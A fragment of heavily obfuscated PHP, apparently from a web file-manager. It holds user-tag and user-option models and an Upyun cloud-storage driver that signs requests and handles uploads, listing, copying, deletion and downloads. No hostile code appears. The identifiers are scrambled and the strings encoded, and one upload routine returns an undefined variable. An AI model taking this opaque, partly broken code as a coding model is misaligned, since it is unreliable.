clear() { $öß¾±–á =& $_SERVER[ì™ı‰º¯]; Model($this->modelType)->remove($öß¾±–á[397], $this->optionType . $öß¾±–á[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÉˆÕ±Îˆ, $ıÃ†ßé¦) { if (!$ıÃ†ßé¦) { return !1; } $ªŠ…ßÄö = $this->listData(); $ªŠ…ßÄö = array_to_keyvalue($ªŠ…ßÄö, $ÉˆÕ±Îˆ); return isset($ªŠ…ßÄö[$ıÃ†ßé¦]) ? $ªŠ…ßÄö[$ıÃ†ßé¦] : !1; } public function findByName($‹ğ”¿•œ) { return $this->findByKey($_SERVER[ì™ı‰º¯][32], $‹ğ”¿•œ); } protected function resetData($‰§¤Û‘) { $ÕŠ¡ÖÛ =& $_SERVER[ì™ı‰º¯]; $‰§¤Û‘ = is_array($‰§¤Û‘) ? $‰§¤Û‘ : array(); $Êî°óº = array(); for ($»Ã÷åÙ‹ = 0; $»Ã÷åÙ‹ < count($‰§¤Û‘); $»Ã÷åÙ‹++) { $Êî°óº[$ÕŠ¡ÖÛ[396] . $‰§¤Û‘[$»Ã÷åÙ‹][$ÕŠ¡ÖÛ[399]]] = $‰§¤Û‘[$»Ã÷åÙ‹]; } return Model($this->modelType)->set($Êî°óº, !1, $this->optionType); } private function getAutoName($ƒóĞíù‹) { $¹®«±Î = array_to_keyvalue($this->listData(), $_SERVER[ì™ı‰º¯][32]); if (!$¹®«±Î || !isset($¹®«±Î[$ƒóĞíù‹])) { return $ƒóĞíù‹; } for ($ÁœÅîÑı = 1; $ÁœÅîÑı < count($¹®«±Î); $ÁœÅîÑı++) { $Ûİç˜åÛ = $ƒóĞíù‹ . "\x28{$ÁœÅîÑı}\x29"; if (!isset($¹®«±Î[$Ûİç˜åÛ])) { return $Ûİç˜åÛ; } } return $Ûİç˜åÛ; } } goto c¡±šÊÌÀå; aªš´ïÔùÚ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\157\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ıº”˜–Ò) { return "\x55\x73\x65\x72\117\160\x74\151\x6f\x6e\137{$ıº”˜–Ò}\137" . USER_ID; } protected function filterWhere($¾Ÿ™ÓË²) { $¾Ÿ™ÓË²[$_SERVER[ì™ı‰º¯][1670]] = USER_ID; return $¾Ÿ™ÓË²; } public function cacheRemoveUser($“š¿–¡à, $ÎóˆØßË) { return Cache::remove("\125\163\145\162\117\x70\x74\x69\157\156\137{$“š¿–¡à}\x5f" . $ÎóˆØßË); } protected function optionDefault($ÍÌœ®ç = '') { $¾ïš€—» =& $_SERVER[ì™ı‰º¯]; if ($ÍÌœ®ç == $¾ïš€—»[12]) { return $GLOBALS[$¾ïš€—»[6]][$¾ïš€—»[2350]]; } if ($ÍÌœ®ç == $¾ïš€—»[2351]) { return $GLOBALS[$¾ïš€—»[6]][$¾ïš€—»[2352]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\x61\x67\x4c\x69\x73\164"; public $modelType = "\x55\x73\x65\x72\x4f\160\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\163\164\x79\154\x65", "\x73\157\x72\164"); public function listData($»€ÜÉ = false, $À ­¾Ğè = "\x73\157\x72\x74", $À’ÆşÌ¾ = false) { return parent::listData($»€ÜÉ, $À ­¾Ğè, $À’ÆşÌ¾); } public function remove($¡ïĞ¹…) { return parent::remove($¡ïĞ¹…); } public function add($¼˜ËïÀ, $ù‚ÏãíÂ = "\x6c\x61\x62\145\154\55\147\162\x65\x79\x2d\156\157\162\155\141\154") { $Ëñæ…×Õ =& $_SERVER[ì™ı‰º¯]; if ($this->findByName($¼˜ËïÀ)) { return !1; } $äı©™øÕ = array($Ëñæ…×Õ[420] => $¼˜ËïÀ, $Ëñæ…×Õ[484] => $ù‚ÏãíÂ, $Ëñæ…×Õ[1863] => $this->getSort($Ëñæ…×Õ[258]) + 1); return parent::insert($äı©™øÕ); } public function update($®·³ÑØ, $†¥ŠúÍ) { $şìŒßœø =& $_SERVER[ì™ı‰º¯]; $ÑÍÏØ’Ã = $this->listData($®·³ÑØ); $‰Õ‚«ı® = $this->findByName($†¥ŠúÍ[$şìŒßœø[32]]); if (!$ÑÍÏØ’Ã || $‰Õ‚«ı® && $‰Õ‚«ı®[$şìŒßœø[399]] != $ÑÍÏØ’Ã[$şìŒßœø[399]]) { return !1; } return parent::update($®·³ÑØ, $†¥ŠúÍ); } public function moveTop($ç°ŞÉ) { $Üã½¼îº =& $_SERVER[ì™ı‰º¯]; $ÏÕª³ùè = parent::listData(); $©”çõ÷õ = $this->getSort($Üã½¼îº[257]); foreach ($ÏÕª³ùè as &$¾ñÑØ†Ò) { if ($¾ñÑØ†Ò[$Üã½¼îº[399]] == $ç°ŞÉ) { $¾ñÑØ†Ò[$Üã½¼îº[1883]] = $©”çõ÷õ; continue; } $¾ñÑØ†Ò[$Üã½¼îº[1883]] += 1; } unset($¾ñÑØ†Ò); return parent::resetData($ÏÕª³ùè); } public function moveBottom($ÀÑš¤ş) { $İÓûÀ =& $_SERVER[ì™ı‰º¯]; $¥…¶×â = $this->getSort($İÓûÀ[258]) + 1; return parent::update($ÀÑš¤ş, array($İÓûÀ[1883] => $¥…¶×â)); } public function resetSort($À²Ååİ¿) { $‰¯²‘Ğ =& $_SERVER[ì™ı‰º¯]; $ø©àÅô› = array(); $À²Ååİ¿ = is_array($À²Ååİ¿) ? $À²Ååİ¿ : array(); for ($¨ÒÔÎâÑ = 0; $¨ÒÔÎâÑ < count($À²Ååİ¿); $¨ÒÔÎâÑ++) { $ø©àÅô›[$À²Ååİ¿[$¨ÒÔÎâÑ] . $‰¯²‘Ğ[12]] = $¨ÒÔÎâÑ + 1; } $«æÄ±Ë’ = parent::listData(); foreach ($«æÄ±Ë’ as &$“ÃƒµĞí) { $şâÛ÷ŞÌ = $ø©àÅô›[$“ÃƒµĞí[$‰¯²‘Ğ[399]]]; $“ÃƒµĞí[$‰¯²‘Ğ[1883]] = $şâÛ÷ŞÌ ? $şâÛ÷ŞÌ : $“ÃƒµĞí[$‰¯²‘Ğ[1883]]; } unset($“ÃƒµĞí); return parent::resetData($«æÄ±Ë’); } private function getSort($±Œ˜­Öœ) { $úô¸Ñ¯Ì =& $_SERVER[ì™ı‰º¯]; $¥×ÅŞë– = parent::listData(); $À¾Ğ…üû = array_to_keyvalue($¥×ÅŞë–, $úô¸Ñ¯Ì[12], $úô¸Ñ¯Ì[1883]); if (!$À¾Ğ…üû) { $À¾Ğ…üû = array(0); } $½ê¥Ëö‘ = $±Œ˜­Öœ == $úô¸Ñ¯Ì[258] ? max($À¾Ğ…üû) : min($À¾Ğ…üû); return intval($½ê¥Ëö‘); } } goto CÎŒ¼Ó½”ö; eÉªòæì‹: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\57\57\166\60\x2e\141\160\x69\x2e\x75\160\171\x75\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¦úÅÛ ) { parent::__construct(); $this->_init($¦úÅÛ ); } public function _init($ÚƒßÇõ) { $¶¢Ó¯™¤ =& $_SERVER[ì™ı‰º¯]; foreach ($ÚƒßÇõ as $÷»ôÌ· => $òäÕŒ¬Ê) { if (isset($this->{$÷»ôÌ·})) { $this->{$÷»ôÌ·} = $òäÕŒ¬Ê; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¶¢Ó¯™¤[1464] . LNG($¶¢Ó¯™¤[1395])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($­¾„ßéş, $æ…ßŞ³ = "\x47\x45\x54") { $øĞÊ÷¬Ú =& $_SERVER[ì™ı‰º¯]; $²úíÃË½ = gmdate($øĞÊ÷¬Ú[1428]); $¤ßğ§¾Ü = base64_encode(hash_hmac($øĞÊ÷¬Ú[1465], "{$æ…ßŞ³}\46{$­¾„ßéş}\x26{$²úíÃË½}", md5("{$this->userpass}"), !0)); $”ÃØ›Û¨ = array("\x41\165\x74\x68\x6f\162\151\172\x61\164\151\157\156\72\x55\x50\x59\x55\116\40{$this->username}\72{$¤ßğ§¾Ü}", "\x44\141\x74\145\x3a{$²úíÃË½}"); return $”ÃØ›Û¨; } public function ussRequest($Îò¸±æï, $Š½ø¾©­ = "\x47\105\x54", $¤˜ÒÇ = false, $ñùû = false, $òÕÜ«‚¬ = false) { $—Ö™œØŸ =& $_SERVER[ì™ı‰º¯]; $Îò¸±æï = trim($Îò¸±æï, $—Ö™œØŸ[8]); $øƒ˜Ö€î = "\x2f{$this->bucket}\57{$Îò¸±æï}"; $ÅÁâ»Ô¨ = $this->ussHeaders($øƒ˜Ö€î, $Š½ø¾©­); if ($ñùû) { $ÅÁâ»Ô¨ = array_merge($ÅÁâ»Ô¨, $ñùû); } $²¹ßŞİ‰ = url_request($this->endpoint . $øƒ˜Ö€î, $Š½ø¾©­, $¤˜ÒÇ, $ÅÁâ»Ô¨, $òÕÜ«‚¬); if (!$²¹ßŞİ‰) { return array($—Ö™œØŸ[1211] => !1, $—Ö™œØŸ[1201] => $—Ö™œØŸ[1466]); } if (strtolower($Š½ø¾©­) == $—Ö™œØŸ[197] || in_array($²¹ßŞİ‰[$—Ö™œØŸ[1211]], array($—Ö™œØŸ[1321], $—Ö™œØŸ[1467]))) { $¤˜ÒÇ = $²¹ßŞİ‰[$—Ö™œØŸ[1468]]; } else { $¤˜ÒÇ = json_decode($²¹ßŞİ‰[$—Ö™œØŸ[1201]], !0); if (!$¤˜ÒÇ) { $¤˜ÒÇ = $²¹ßŞİ‰[$—Ö™œØŸ[1201]]; } else { if (!$²¹ßŞİ‰[$—Ö™œØŸ[745]] && isset($¤˜ÒÇ[$—Ö™œØŸ[1469]])) { $¤˜ÒÇ = $¤˜ÒÇ[$—Ö™œØŸ[1469]]; } } } return array($—Ö™œØŸ[1211] => $²¹ßŞİ‰[$—Ö™œØŸ[745]], $—Ö™œØŸ[1201] => $¤˜ÒÇ); } public function mkfile($¹È§åë, $óôçæ¾ø = '', $ÔÕ‚øÕ = REPEAT_RENAME) { if ($this->setContent($¹È§åë, $óôçæ¾ø)) { return $this->getPathOuter($¹È§åë); } return !1; } public function mkdir($‚¸§‰É±, $÷Ò¯Óşà = REPEAT_SKIP) { $–‚à¦‚î =& $_SERVER[ì™ı‰º¯]; $ØÊµ‹Ï = trim($‚¸§‰É±, $–‚à¦‚î[8]); if ($this->_isFolder($ØÊµ‹Ï)) { return $this->getPathOuter($ØÊµ‹Ï); } $¸ÊÑ‚øÏ = array($–‚à¦‚î[1470]); $Ó–ä³€„ = $this->ussRequest($ØÊµ‹Ï, $–‚à¦‚î[226], !1, $¸ÊÑ‚øÏ); return $Ó–ä³€„[$–‚à¦‚î[1211]] ? $this->getPathOuter($ØÊµ‹Ï) : !1; } public function copyFile($¸—Ä¯ôÈ, $¦‡š¿¨Ó) { $ÈÒô´‰¿ =& $_SERVER[ì™ı‰º¯]; $‘´ãÏ·µ = array($ÈÒô´‰¿[1471] . "\x2f{$this->bucket}\57{$¸—Ä¯ôÈ}", $ÈÒô´‰¿[1472]); $âÂ”üËÏ = $this->ussRequest($¦‡š¿¨Ó, $ÈÒô´‰¿[228], !1, $‘´ãÏ·µ); return $âÂ”üËÏ[$ÈÒô´‰¿[1211]] ? !0 : $this->getPathOuter($¦‡š¿¨Ó); } public function moveFile($”Ç¯¥â, $¾ğÅ²œş) { $ìşôõ¿€ =& $_SERVER[ì™ı‰º¯]; $¦›Š¹µà = array($ìşôõ¿€[1473] . "\x2f{$this->bucket}\x2f{$”Ç¯¥â}", $ìşôõ¿€[1472]); $Óƒ§¥ˆ¸ = $this->ussRequest($¾ğÅ²œş, $ìşôõ¿€[228], !1, $¦›Š¹µà); return $Óƒ§¥ˆ¸[$ìşôõ¿€[1211]] ? !0 : $this->getPathOuter($¾ğÅ²œş); } public function delFile($Å­ÃãÛ) { $¹ÑÄâ… =& $_SERVER[ì™ı‰º¯]; $á¬¼ˆüø = $this->ussRequest($Å­ÃãÛ, $¹ÑÄâ…[1474]); return $á¬¼ˆüø[$¹ÑÄâ…[1211]] ? !0 : !1; } public function delFolder($¶Ş–Àİ‡) { $ïŒÆ®ÆÓ =& $_SERVER[ì™ı‰º¯]; if (!$this->exist($¶Ş–Àİ‡)) { return !0; } $this->listItemCache = !1; $ı±©ÄÉæ = $„«‘™Ä = array(); $this->fileList($¶Ş–Àİ‡, $ı±©ÄÉæ, $„«‘™Ä, !0); $this->listItemCache = !0; foreach ($„«‘™Ä as $‹ÜÙæ‚¿) { $š™İ¡àâ = $this->ussRequest($‹ÜÙæ‚¿[$ïŒÆ®ÆÓ[32]], $ïŒÆ®ÆÓ[1474]); if (!$š™İ¡àâ[$ïŒÆ®ÆÓ[1211]]) { return !1; } } foreach ($ı±©ÄÉæ as $Œò°æ) { $š™İ¡àâ = $this->ussRequest($Œò°æ, $ïŒÆ®ÆÓ[1474]); if (!$š™İ¡àâ[$ïŒÆ®ÆÓ[1211]]) { return !1; } } $š™İ¡àâ = $this->ussRequest($¶Ş–Àİ‡, $ïŒÆ®ÆÓ[1474]); return $š™İ¡àâ[$ïŒÆ®ÆÓ[1211]]; } public function rename($Ì«ñ¬ûÕ, $¾ì ¢¸ı) { if ($this->isFile($Ì«ñ¬ûÕ)) { $¾ì ¢¸ı = get_path_father($Ì«ñ¬ûÕ) . $¾ì ¢¸ı; return $this->moveFile($Ì«ñ¬ûÕ, $¾ì ¢¸ı); } return $this->renameObject($Ì«ñ¬ûÕ, $¾ì ¢¸ı); } public function fileInfo($úÈ¶¤„¤, $ñôéê×û = false, $ÀÑ›†ûÌ = array()) { $Ñ¶Ì´†ï =& $_SERVER[ì™ı‰º¯]; $ä¶‘çç© = array($Ñ¶Ì´†ï[32] => $this->pathThis($úÈ¶¤„¤), $Ñ¶Ì´†ï[84] => $this->getPathOuter($Ñ¶Ì´†ï[8] . $úÈ¶¤„¤), $Ñ¶Ì´†ï[33] => $Ñ¶Ì´†ï[200], $Ñ¶Ì´†ï[76] => isset($ÀÑ›†ûÌ[$Ñ¶Ì´†ï[76]]) ? $ÀÑ›†ûÌ[$Ñ¶Ì´†ï[76]] : 0, $Ñ¶Ì´†ï[174] => $this->ext($úÈ¶¤„¤)); if ($ñôéê×û) { return $ä¶‘çç©; } $ä¶‘çç©[$Ñ¶Ì´†ï[201]] = $ä¶‘çç©[$Ñ¶Ì´†ï[85]] = 0; $ä¶‘çç©[$Ñ¶Ì´†ï[202]] = $ä¶‘çç©[$Ñ¶Ì´†ï[203]] = !0; if (empty($ÀÑ›†ûÌ)) { $ÀÑ›†ûÌ = $this->objectMeta($úÈ¶¤„¤); if (!$ÀÑ›†ûÌ) { return $ä¶‘çç©; } } $ä¶‘çç©[$Ñ¶Ì´†ï[201]] = intval($ÀÑ›†ûÌ[$Ñ¶Ì´†ï[1475]]); $ä¶‘çç©[$Ñ¶Ì´†ï[85]] = intval($ÀÑ›†ûÌ[$Ñ¶Ì´†ï[1476]]); $ä¶‘çç©[$Ñ¶Ì´†ï[76]] = $ÀÑ›†ûÌ[$Ñ¶Ì´†ï[76]]; return $ä¶‘çç©; } public function folderInfo($…ş©”ë, $ˆ†ÁÇ¥¼ = false) { $¬§Ò á¾ =& $_SERVER[ì™ı‰º¯]; $¹»á¯¶Û = array($¬§Ò á¾[32] => $this->pathThis($…ş©”ë), $¬§Ò á¾[84] => $this->getPathOuter($¬§Ò á¾[8] . $…ş©”ë), $¬§Ò á¾[33] => $¬§Ò á¾[75]); if ($ˆ†ÁÇ¥¼) { return $¹»á¯¶Û; } $¹»á¯¶Û[$¬§Ò á¾[201]] = $¹»á¯¶Û[$¬§Ò á¾[85]] = 0; $¹»á¯¶Û[$¬§Ò á¾[202]] = $¹»á¯¶Û[$¬§Ò á¾[203]] = !0; if (empty($×Û‹Èü)) { $×Û‹Èü = $this->objectMeta($…ş©”ë); if (!$×Û‹Èü) { return $¹»á¯¶Û; } } $¹»á¯¶Û[$¬§Ò á¾[201]] = intval($×Û‹Èü[$¬§Ò á¾[1475]]); $¹»á¯¶Û[$¬§Ò á¾[85]] = intval($×Û‹Èü[$¬§Ò á¾[1476]]); return $¹»á¯¶Û; } private function listObjs($«ïÛô, $¹±•“»» = 0, $–¦ÊÈ¡‘ = 1000) { $¿Éºğ =& $_SERVER[ì™ı‰º¯]; $öåë¡§ö = array($¿Éºğ[1477], $¿Éºğ[1478] . $–¦ÊÈ¡‘); if ($¹±•“»») { $öåë¡§ö[] = $¿Éºğ[1479] . $¹±•“»»; } $«©ı¢µ = $this->ussRequest($«ïÛô, $¿Éºğ[230], !1, $öåë¡§ö); return !$«©ı¢µ[$¿Éºğ[1211]] ? !1 : $«©ı¢µ[$¿Éºğ[1201]]; } private function fileList($Ç°¨É¢, &$«Üû¶˜Ê, &$£îĞÍ‹‰, $¿¹ÛË›Ÿ = false) { $şÍˆï¡ =& $_SERVER[ì™ı‰º¯]; $—ûÏòİ = $şÍˆï¡[12]; $ôÁ‚ßÒ = 1000; $¾úø¢Üú = rtrim($Ç°¨É¢, $şÍˆï¡[8]) . $şÍˆï¡[8]; while (!0) { check_abort(); $ÕÆÛ¤Ò‘ = $this->listObjs($Ç°¨É¢, $—ûÏòİ, $ôÁ‚ßÒ); if (!$ÕÆÛ¤Ò‘) { return !1; } $—ûÏòİ = isset($ÕÆÛ¤Ò‘[$şÍˆï¡[1480]]) ? $ÕÆÛ¤Ò‘[$şÍˆï¡[1480]] : $şÍˆï¡[12]; $Ù”˜È— = isset($ÕÆÛ¤Ò‘[$şÍˆï¡[1481]]) ? $ÕÆÛ¤Ò‘[$şÍˆï¡[1481]] : array(); foreach ($Ù”˜È— as $ö­Â•ê·) { $Í™Â»á = $ö­Â•ê·[$şÍˆï¡[33]] == $şÍˆï¡[75] ? !0 : !1; $É÷âØúµ = ltrim($¾úø¢Üú . $ö­Â•ê·[$şÍˆï¡[32]], $şÍˆï¡[8]) . ($Í™Â»á ? $şÍˆï¡[8] : $şÍˆï¡[12]); $¢Úó‹ìû = array($şÍˆï¡[32] => $É÷âØúµ, $şÍˆï¡[33] => $Í™Â»á ? $şÍˆï¡[75] : $şÍˆï¡[200], $şÍˆï¡[76] => $ö­Â•ê·[$şÍˆï¡[337]], $şÍˆï¡[1476] => $ö­Â•ê·[$şÍˆï¡[1482]]); $this->cacheMethodInfoSet($É÷âØúµ, $Í™Â»á, $¢Úó‹ìû); if ($Í™Â»á) { $«Üû¶˜Ê[] = $É÷âØúµ; if ($¿¹ÛË›Ÿ) { $this->fileList($É÷âØúµ, $«Üû¶˜Ê, $£îĞÍ‹‰, $¿¹ÛË›Ÿ); } continue; } $£îĞÍ‹‰[] = $¢Úó‹ìû; } if (count($Ù”˜È—) < $ôÁ‚ßÒ) { break; } } $this->cacheMethodInfoSet($Ç°¨É¢, !0); } public function listPath($îöüƒ, $ûÆ¸Œ¸ = false) { $Ó­¡İçô =& $_SERVER[ì™ı‰º¯]; $·¦êŠ = $¡¨ÂÉû² = array(); $this->fileList($îöüƒ, $·¦êŠ, $¡¨ÂÉû²); foreach ($·¦êŠ as $¬Öâ¿± => $‘‰‹½…û) { $·¦êŠ[$¬Öâ¿±] = $this->folderInfo($‘‰‹½…û, $ûÆ¸Œ¸); } foreach ($¡¨ÂÉû² as $¬Öâ¿± => $‘‰‹½…û) { $¡¨ÂÉû²[$¬Öâ¿±] = $this->fileInfo($‘‰‹½…û[$Ó­¡İçô[32]], $ûÆ¸Œ¸, $‘‰‹½…û); } return array($Ó­¡İçô[82] => $·¦êŠ, $Ó­¡İçô[83] => $¡¨ÂÉû²); } public function has($ışÆ» , $éÁÜ‚» = false, $ß§«š–Ğ = true) { $§Ô±Äß· =& $_SERVER[ì™ı‰º¯]; $÷Œ›÷·Ò = $§Ô±Äß·[12]; $‚Ø†„ˆ® = 500; $–ä¼´àŠ = 0; $”„ğºâÑ = 0; $œ¾®Ï¤± = rtrim($ışÆ» , $§Ô±Äß·[8]) . $§Ô±Äß·[8]; while (!0) { check_abort(); $¡–Ø”Á = $this->listObjs($ışÆ» , $÷Œ›÷·Ò, $‚Ø†„ˆ®); if (!$¡–Ø”Á) { return !1; } $÷Œ›÷·Ò = isset($¡–Ø”Á[$§Ô±Äß·[1480]]) ? $¡–Ø”Á[$§Ô±Äß·[1480]] : $§Ô±Äß·[12]; $”¢÷­– = isset($¡–Ø”Á[$§Ô±Äß·[1481]]) ? $¡–Ø”Á[$§Ô±Äß·[1481]] : array(); if (empty($”¢÷­–)) { break; } $Œ¢Ü¿ıö = array_filter($”¢÷­–, function ($Üæº‹İ) { $»ìğÙı =& $_SERVER[ì™ı‰º¯]; return $Üæº‹İ[$»ìğÙı[33]] == $»ìğÙı[75]; }); $½ÌÅ¯Ä½ = count($”¢÷­–); $Œ¢Ü¿ıö = count($Œ¢Ü¿ıö); $“öŞ © = $½ÌÅ¯Ä½ - $Œ¢Ü¿ıö; if ($éÁÜ‚») { $”„ğºâÑ += $Œ¢Ü¿ıö; $–ä¼´àŠ += $“öŞ ©; if ($½ÌÅ¯Ä½ < $‚Ø†„ˆ®) { break; } continue; } if ($ß§«š–Ğ) { if ($“öŞ ©) { return !0; } } else { if ($Œ¢Ü¿ıö) { return !0; } } if ($½ÌÅ¯Ä½ < $‚Ø†„ˆ®) { break; } } if ($éÁÜ‚») { return array($§Ô±Äß·[207] => $–ä¼´àŠ, $§Ô±Äß·[208] => $”„ğºâÑ); } return !1; } public function listAll($¨»ôˆà) { $Ñ¿ãŸí‹ =& $_SERVER[ì™ı‰º¯]; $­ÓÖœ¶ = $Ÿõ§Â¥† = array(); $this->fileList($¨»ôˆà, $­ÓÖœ¶, $Ÿõ§Â¥†, !0); $„»ÜƒÚÃ = array_to_keyvalue($Ÿõ§Â¥†, $Ñ¿ãŸí‹[32]); foreach ($­ÓÖœ¶ as $Ã¹×‰Â) { if (is_string($Ã¹×‰Â)) { $„»ÜƒÚÃ[$Ã¹×‰Â] = array($Ñ¿ãŸí‹[76] => 0); } } return $this->listAllFiles($¨»ôˆà, $„»ÜƒÚÃ); } public function canRead($‚îÛÍ¼Ö) { return $this->exist($‚îÛÍ¼Ö) ? !0 : !1; } public function canWrite($‡Ç¡ä¬†) { return $this->exist($‡Ç¡ä¬†) ? !0 : !1; } public function getContent($ù×—Ï±Ë) { return $this->fileSubstr($ù×—Ï±Ë, 0, -1); } public function setContent($í§ÜõáÌ, $­¸ÏŒú› = '') { $¯ÓùáŸ =& $_SERVER[ì™ı‰º¯]; if (!$­¸ÏŒú›) { $›Ûœ•Æ = $this->ussRequest($í§ÜõáÌ, $¯ÓùáŸ[226]); return $›Ûœ•Æ[$¯ÓùáŸ[1211]]; } $É¦¤ƒş„ = $this->tempFile($this->pathThis($í§ÜõáÌ)); file_put_contents($É¦¤ƒş„, $­¸ÏŒú›); if ($this->upload($í§ÜõáÌ, $É¦¤ƒş„)) { $this->tempFileRemve($É¦¤ƒş„); return !0; } return !1; } public function fileSubstr($ÏÀ¤´¼¹, $ö·Ææµ¤, $ì–û†°·) { $±û¾ĞÜÃ =& $_SERVER[ì™ı‰º¯]; if (!($ÄÏÏâæ„ = $this->link($ÏÀ¤´¼¹))) { return !1; } $îÊ”»Ø = !1; if ($ì–û†°· > 0) { $œœ¶º•è = $ö·Ææµ¤ + $ì–û†°· - 1; $îÊ”»Ø = array($±û¾ĞÜÃ[1443] . $ö·Ææµ¤ . $±û¾ĞÜÃ[386] . $œœ¶º•è); } $’¦«°ƒ“ = url_request($ÄÏÏâæ„, $±û¾ĞÜÃ[230], !1, $îÊ”»Ø); return $’¦«°ƒ“[$±û¾ĞÜÃ[745]] ? $’¦«°ƒ“[$±û¾ĞÜÃ[1201]] : !1; } public function upload($Àõâœ£½, $Õ´òõÑ·, $¨¶ûÆ› = false, $Ï½ÔìÆÛ = REPEAT_REPLACE) { $Ï×í˜– =& $_SERVER[ì™ı‰º¯]; $³ñ’ÈİÃ = IO::size($Õ´òõÑ·); if ($³ñ’ÈİÃ <= 1024 * 1024 * 200) { $©êËÁÂ = array($Ï×í˜–[1483] . $Õ´òõÑ·); $—²è§»Û = $this->ussRequest($Àõâœ£½, $Ï×í˜–[228], $©êËÁÂ); return $—²è§»Û[$Ï×í˜–[1211]] ? $this->getPathOuter($Àõâœ£½) : !1; } $ÖöĞ¹îü = 1024 * 1024 * 10; $ûºÕ’ƒô = array($Ï×í˜–[1484], $Ï×í˜–[1485] . $³ñ’ÈİÃ, $Ï×í˜–[1486], $Ï×í˜–[1487] . $ÖöĞ¹îü); $—²è§»Û = $this->ussRequest($Àõâœ£½, $Ï×í˜–[228], !1, $ûºÕ’ƒô); if (!$—²è§»Û[$Ï×í˜–[1211]]) { return !1; } $úª§ã‡İ = $—²è§»Û[$Ï×í˜–[1201]]; $““ÀĞã• = 0; $ŠîÇŸô³ = $úª§ã‡İ[$Ï×í˜–[1488]]; $‰ÀÛĞÕë = fopen($Õ´òõÑ·, $Ï×í˜–[1392]); if (!$‰ÀÛĞÕë) { return !1; } do { $‘‘ÌÌØ¬ = $úª§ã‡İ[$Ï×í˜–[1489]]; fseek_64($‰ÀÛĞÕë, $““ÀĞã•); $“³¶ÔŠ = fread($‰ÀÛĞÕë, $‘‘ÌÌØ¬); $¸†Ê›«¸ = 0; do { $¸†Ê›«¸++; $úª§ã‡İ = $this->uploadPart($Àõâœ£½, $úª§ã‡İ, $“³¶ÔŠ); } while (!$úª§ã‡İ && $¸†Ê›«¸ < 3); if (!$úª§ã‡İ) { return !1; } $ŠîÇŸô³ = $úª§ã‡İ[$Ï×í˜–[1488]]; $““ÀĞã• += $‘‘ÌÌØ¬; } while ($ŠîÇŸô³ != -1); fclose($‰ÀÛĞÕë); $ûºÕ’ƒô = array($Ï×í˜–[1490], $Ï×í˜–[1491] . $úª§ã‡İ[$Ï×í˜–[1492]], $Ï×í˜–[1486]); $—²è§»Û = $this->ussRequest($Àõâœ£½, $Ï×í˜–[228], !1, $ûºÕ’ƒô); return $—²è§»Û[$Ï×í˜–[1211]] ? $this->getPathOuter($ ‘ÆÇ¯„) : !1; } private function uploadPart($Š —Ü–Í, $Ìı±úå, &$¶üŠû»Ş) { $¶ö‘“ŞÈ =& $_SERVER[ì™ı‰º¯]; $ŠŠ§Š¬³ = array($¶ö‘“ŞÈ[1493], $¶ö‘“ŞÈ[1491] . $Ìı±úå[$¶ö‘“ŞÈ[1492]], $¶ö‘“ŞÈ[1494] . $Ìı±úå[$¶ö‘“ŞÈ[1488]], $¶ö‘“ŞÈ[142] . $Ìı±úå[$¶ö‘“ŞÈ[1489]]); $”¯µ¦¤² = $this->ussRequest($Š —Ü–Í, $¶ö‘“ŞÈ[228], $¶üŠû»Ş, $ŠŠ§Š¬³); return !$”¯µ¦¤²[$¶ö‘“ŞÈ[1211]] ? $”¯µ¦¤²[$¶ö‘“ŞÈ[1211]] : $”¯µ¦¤²[$¶ö‘“ŞÈ[1201]]; } public function uploadFormData($Ã³ô×íß, $ö÷Šöò = 3600) { return $this->uploadPolicy($Ã³ô×íß, $ö÷Šöò); } public function multiUploadFormData($õ¢¤çøî, $ËÈÅâ… = 3600) { $¶Îš³é† =& $_SERVER[ì™ı‰º¯]; $××Ù™ = (int) $GLOBALS[$¶Îš³é†[7]][$¶Îš³é†[76]]; return $this->uploadPolicy($õ¢¤çøî, $ËÈÅâ…, $××Ù™); } private function uploadPolicy($Æ„Áíš, $ËØ—Ñ· = 3600, $ŸËëî·Ù = 0) { $¸¾›à˜Š =& $_SERVER[ì™ı‰º¯]; $»…ıéÎÏ = $¸¾›à˜Š[8] . $this->bucket; $¥ÙÜÃÁŸ = gmdate($¸¾›à˜Š[1428]); $İ…™ÏªÆ = array($¸¾›à˜Š[1495] => $this->bucket, $¸¾›à˜Š[1496] => $Æ„Áíš, $¸¾›à˜Š[1497] => time() + $ËØ—Ñ·, $¸¾›à˜Š[1498] => $¥ÙÜÃÁŸ); if ($ŸËëî·Ù) { $İ…™ÏªÆ[$¸¾›à˜Š[1408]] = $ŸËëî·Ù; } $ñôŞÎ½ = base64_encode(json_encode($İ…™ÏªÆ)); $îø«¨È¶ = base64_encode(hash_hmac($¸¾›à˜Š[1465], "\x50\117\x53\124\46{$»…ıéÎÏ}\46{$¥ÙÜÃÁŸ}\46{$ñôŞÎ½}", md5("{$this->userpass}"), !0)); $Àô»¶ØÈ = array($¸¾›à˜Š[1333] => $ñôŞÎ½, $¸¾›à˜Š[1499] => "\125\120\x59\125\116\40{$this->username}\x3a{$îø«¨È¶}", $¸¾›à˜Š[182] => $this->endpoint . $»…ıéÎÏ); return $Àô»¶ØÈ; } public function download($ˆ×ˆ¥×, $Ö¬‡¼ØÌ) { $•­”ò·„ = IO::getPathInner(IO::mkfile($Ö¬‡¼ØÌ)); if (!($ï§ö§Ÿ = $this->link($ˆ×ˆ¥×))) { return !1; } $Œ¤åÆ½ğ = 0; $æ¡±µË® = 1024 * 200; $¿ı×†µ = fopen($•­”ò·„, $_SERVER[ì™ı‰º¯][1449]); while (!0) { $¡Œ¯ÀâÕ = $this->fileSubstr($ˆ×ˆ¥×, $Œ¤åÆ½ğ, $æ¡±µË®); if ($¡Œ¯ÀâÕ === !1) { return !1; } fwrite($¿ı×†µ, $¡Œ¯ÀâÕ); $Œ¤åÆ½ğ += $æ¡±µË®; if (strlen($¡Œ¯ÀâÕ) < $æ¡±µË®) { break; } } 